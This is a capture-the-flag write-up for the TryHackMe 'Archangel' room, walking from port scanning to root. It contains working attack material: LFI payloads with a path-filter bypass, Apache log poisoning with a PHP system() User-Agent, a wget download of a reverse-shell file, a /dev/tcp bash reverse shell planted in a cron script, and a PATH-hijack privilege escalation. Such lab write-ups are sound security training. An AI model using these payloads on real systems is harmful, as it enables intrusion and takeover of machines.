# THM: Archangel

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/archangel/archangel.jpeg" alt="Archangel" width="90"/> |
| Room | Archangel |
| URL | [https://tryhackme.com/room/archangel](https://tryhackme.com/room/archangel) |
| Difficulty | Easy |

## Concepts/Tools Used

- [gobuster](/tools/gobuster.md)
- PHP
- base64
- [Local File Inclusion](/vulnerabilities/local_file_inclusion.md)
- Cron

## Room Description

Boot2root, Web exploitation, Privilege escalation, LFI

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-21 16:28 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
Initiating ARP Ping Scan at 16:28
Scanning target.thm (10.10.92.163) [1 port]
Completed ARP Ping Scan at 16:28, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:28
Scanning target.thm (10.10.92.163) [65535 ports]
Discovered open port 22/tcp on 10.10.92.163
Discovered open port 80/tcp on 10.10.92.163
Completed SYN Stealth Scan at 16:28, 5.34s elapsed (65535 total ports)
Initiating Service scan at 16:28
Scanning 2 services on target.thm (10.10.92.163)
Completed Service scan at 16:29, 6.14s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.92.163.
Initiating NSE at 16:29
Completed NSE at 16:29, 0.20s elapsed
Initiating NSE at 16:29
Completed NSE at 16:29, 0.02s elapsed
Initiating NSE at 16:29
Completed NSE at 16:29, 0.00s elapsed
Nmap scan report for target.thm (10.10.92.163)
Host is up (0.00022s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
MAC Address: 02:3F:51:8E:C0:F5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 16:29
Completed NSE at 16:29, 0.00s elapsed
Initiating NSE at 16:29
Completed NSE at 16:29, 0.00s elapsed
Initiating NSE at 16:29
Completed NSE at 16:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 71281 (3.649MB)
```

## Find a different hostname

Viewing the source code of http://target.thm, the email to address is support@mafialive.thm. The hint was to look for another domain. This must be the one they are talking about. I added mafialive.thm to the /etc/hosts file.

## Find flag 1

I got to http://mafialive.thm and I notice a flag.

Now that I have a new domain, I run gobuster again:

```bash
$ gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 286]
/robots.txt           (Status: 200) [Size: 34]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```

## Look for a page under development

The robots.txt page referenced the /test.php path. Going to http://mafialive.thm/test.php shows a page with a button. Clicking the button shows the contents of the var/www/html/development_testing/mrrobot.php file "Control is an illusion".

## Find flag 2

I tried to view other files like /etc/passwd or ../../../../etc/passwd and it didn't work. Filtering is happening on the server side and I need to bypass it. The filtering must be happening on the test.php file so I try to grab it using the url http://mafialive.thm/test.php?view=/var/www/html/development_testing/test.php.

This doesn't work as expected. I remember in other capture the flag events that PHP has a way in the url of telling PHP to base64 encode a file before sending it back as a response. Here is the following url format to base64 encode a response with PHP:

`php://filter/convert.base64-encode/resource=/file/I/want/to/view.php`

With that in mind, I viewed the test.php file with the following url:

`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

I got the following output which I ran through the base64 binary:

```bash
$ echo 'CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==' | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

   //FLAG: REDACTED

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
   if(isset($_GET["view"])){
   if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            include $_GET['view'];
            }else{

echo 'Sorry, Thats not allowed';
            }
}
        ?>
    </div>
</body>

</html>
```

There is a flag in this source code.

## Getting a Foothold

As I read the code I notice the request paths must contain the /var/www/html/development_testing directory and not include ../.. in the path. I can use the required directory and add ..// to go back a directory and not get caught in the filter. Linux treats // as a single slash when resolving paths. I grab the contents of /etc/passwd with the following url:

`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd`

Cleaning up the response a bit gives the following:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

I noted the user archangel and root.

At this point I had to read a guide, I was stuck and the hint was said "poison" and I wasn't sure what it was talking about.

It turns out that the poison hint was referring to poison logs. Meaning that I can read log files and include commands in my request headers that will get executed by the server. I am always impressed when I read about these exploits that people have found.

I copy the web shell on the local machine:

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

I edit the shell.php file to use my attack machine ip and port 4444. I then start up a python server that the target machine will hit to grab my shell.php file:

```bash
$ python3 -m http.server
```

Here is the full poison logs http request that I made:

```bash
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..///var/log/apache2/access.log&cmd=wget%20http://<attack_machine_ip>:8000/shell.php HTTP/1.1
Host: mafialive.thm
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

There is a lot going on with this request. Here are the things to notice:

- The `User-Agent` header executes whatever is passed in the query parameter `cmd`.
- The url includes a `cmd` query parameter that downloads the shell.php file that the python server is serving.
- Notice that the `view` query parameter is grabbing the access logs of Apache. This is part of the poison logs attack.
- Also notice that the path to the logs uses // to help bypase the filtering of the `test.php` file.

This command executes and my python server shows that a request was made for the `shell.php` file. This means that the `shell.php` file is at the same directory as `test.php`. I start up a listener on my attack machine:

```bash
$ nc -lnvp 4444
```

I call out to http://mafialive.thm/shell.php to get a shell.

I have a shell. I'm in!

## Get a shell and find the user flag

I run my commands to [stablize the shell](/README.md#stable-shell).

I go to /home/archangel and see that it contains the user.txt file. I grab that flag:

```bash
$ cd /home/archangel
$ cat user.txt
REDACTED
```

## Privilege Escalation

I see that there is another folder in /home/archangel/secret that I can't read. I'll need to become the archangel user or root to view it.

I run my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) and see something promising with the `cat /etc/crontab' command:

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
*/1 *   * * *   archangel /opt/helloworld.sh
17 * * * * root    cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

The archangel user has a cron that runs every minute. I take a look at the permissions of the /opt directory where the script is stored:

```bash
$ ls -lha /opt/
total 16K
drwxrwxrwx  3 root      root      4.0K Nov 20  2020 .
drwxr-xr-x 22 root      root      4.0K Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4.0K Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
```

Anyone can modify the `helloworld.sh` script. I am going to open a new listener on my attack box and change that script so that it connects to my attack box as the archangel user. I start a listener on my attack box:

```bash
nc -lnvp 4445
```

Then I change the contents of the `helloworld.sh` script so that it will connect to the port above with a shell:

```bash
echo '#!/bin/bash\nbash -i >& /dev/tcp/<attack_machine_ip>/4445 0>&1' > /opt/helloworld.sh
```

I wait for a minute and I get a shell.

## Get User 2 flag 

I grab the `user2.txt` flag in the /home/archangel/secret folder that I found earlier:

```bash
$ whoami
archangel
cd /home/archangel/secret
cat user2.txt
REDACTED
```

## Privilege Escalation Again

I run my [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) again with the archangel user this time and see something promising with the `find / -perm -u=s -type f 2>/dev/null' command:

```bash
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping
/home/archangel/secret/backup
```

The last item on the list is my ticket to becoming root. I run strings on the executable and one of the lines catches my eye:

```bash
$ strings /home/archangel/secret/backup
...
cp /home/user/archangel/myfiles/* /opt/backupfiles
...
```

I can create a cp binary and put the new cp binary in my path so that it gets executed before the system one. The new cp binary will spawn a new shell and since /home/archangel/secret/backup is running with the suid bit set, the shell will be root.

I go to the /home/archangel/secret directory. This is the path I will add to the path shortly.

```bash
$ cd /home/archangel/secret
```

I put the following code in a file called `cp` in the /home/archangel/secret directory:

```bash
#!/bin/bash
/bin/bash -i
```

I make the `cp` binary executable:

```bash
$ chmod +x cp
```

Now I add the current directory to the path so that this cp binary will get called before the system one:

```bash
$ export PATH=/home/archangel/secret:$PATH
```

This command is putting /home/archangel/secret at the start of the $PATH variable. In other words, the system will check in /home/archangel/secret for a binary before it checks the rest of the $PATH.

Now I run the `backup.sh` command:

```bash
$ ./backup.sh
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

## Root the machine and find the root flag

I ran the following to get the flag:

```bash
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
REDACTED
```
